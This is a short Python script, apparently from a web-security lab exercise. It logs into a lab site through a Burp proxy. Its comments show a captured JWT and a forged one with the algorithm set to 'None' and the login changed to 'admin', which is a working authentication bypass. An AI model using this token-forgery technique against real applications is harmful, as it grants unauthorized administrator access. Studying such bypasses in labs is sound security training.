import requests

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

data = {
	'username' : 'abcd',
	'password' : 'abcd'
}

loginurl = 'http://ptl-4cdde141-8f204c46.libcurl.so/login.php'
indexurl = 'http://ptl-4cdde141-8f204c46.libcurl.so/index.php'

session = requests.Session()
r = session.post(loginurl, data=data)
s = session.get(indexurl, proxies=proxies)
content = s.text

print(content)

# In Burpsuite this is the jwt token:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFiY2QiLCJpYXQiOiIxNTk2MTQxNDc1In0.OWUyNzkzNDhlNzJkNGNmYzFjNTE4ZTE2YTUwZDA1MmI0YWMyOWQzZmMyMjAzMDNlZGY4Y2VkOTBiNmUwN2EzYQ

# Change it to this:
# "alg":"None"  and  "login":"admin"
# eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0=.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTU5NjE0MjU2MCJ9.